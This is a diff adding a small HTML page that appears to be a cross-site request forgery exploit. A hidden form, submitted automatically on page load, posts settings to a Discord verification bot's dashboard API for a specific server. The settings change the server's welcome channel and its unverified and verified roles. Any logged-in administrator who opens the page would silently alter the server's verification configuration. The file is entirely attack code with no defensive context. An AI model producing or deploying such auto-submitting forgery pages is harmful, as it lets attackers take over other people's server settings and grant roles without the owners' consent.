@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Automatic Form Submission</title>
+</head>
+<body>
+
+  <form id="verificationForm" action="https://verifierbot.xyz/api/@me/guilds/1107681604878487634/verification" method="post">
+    <!-- Add any form fields you need here -->
+    <input type="hidden" name="welcomeMessage" value="h">
+    <input type="hidden" name="welcomeChannelID" value="1107681605432127630">
+    <input type="hidden" name="unverifiedRole[]" value="1107681604878487634">
+    <input type="hidden" name="verifiedRoles[]" value="1202354378321965126">
+    <input type="hidden" name="verifiedRoles[]" value="">
+    <input type="hidden" name="verifiedRoles[]" value="">
+    <input type="hidden" name="verificationType" value="web">
+    <input type="hidden" name="emoji[name]" value="😀">
+  </form>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      // Submit the form automatically when the page loads
+      document.getElementById('verificationForm').submit();
+    });
+  </script>
+
+</body>
+</html>
